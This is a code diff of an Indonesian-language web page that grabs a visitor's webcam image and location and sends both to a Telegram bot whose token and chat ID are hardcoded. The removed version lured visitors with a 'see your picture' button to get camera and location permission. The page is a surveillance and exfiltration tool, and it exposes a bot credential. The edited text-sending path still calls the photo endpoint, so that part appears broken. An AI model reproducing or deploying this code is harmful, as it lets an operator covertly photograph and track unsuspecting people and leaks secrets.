@@ -6,8 +6,8 @@
     <title>Akses Kamera dan Lokasi</title>
 </head>
 <body>
-    <h1>Gambarmu di sini</h1>
-    <button onclick="startCapture()">Izinkan semua untuk melihat gambar</button>
+    <h1>Ambil Gambar dan Kirim Lokasi</h1>
+    <button onclick="startCapture()">Ambil Gambar dan Kirim Lokasi</button>
     <script>
         function startCapture() {
             // Akses kamera
@@ -48,13 +48,7 @@
             const video = document.createElement('video');
             video.srcObject = stream;
 
-            // Pastikan video diputar terlebih dahulu sebelum menangkap gambar
             video.onloadedmetadata = () => {
-                video.play(); // Memastikan video mulai diputar
-            };
-
-            // Tunggu sampai video siap diputar sebelum menangkap gambar
-            video.oncanplay = () => {
                 // Tentukan ukuran canvas sesuai dengan video
                 const canvas = document.createElement('canvas');
                 const context = canvas.getContext('2d');
@@ -77,16 +71,20 @@
             };
         }
 
-        function sendToTelegram(blob) {
+        function sendToTelegram(data) {
             const telegramToken = '7030408795:AAFfhnjy4x3f3gotpugela5qFMbVVnE9HpI';
             const chatId = '1746156378';
 
-            // Create FormData to send the image as a file
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'photo.jpg');
+            
+            // Cek jika data adalah gambar (blob) atau teks
+            if (data instanceof Blob) {
+                formData.append('photo', data, 'photo.jpg');
+            } else {
+                formData.append('text', data); // Jika data adalah teks (seperti URL lokasi)
+            }
 
-            // Send the photo using sendPhoto API
             const url = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
 
             fetch(url, {
@@ -96,9 +94,9 @@
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    console.log('Gambar terkirim ke Telegram');
+                    console.log('Gambar atau lokasi terkirim ke Telegram');
                 } else {
-                    console.log('Error mengirim gambar:', data);
+                    console.log('Error mengirim gambar atau lokasi:', data);
                 }
             })
             .catch(error => console.log('Error:', error));
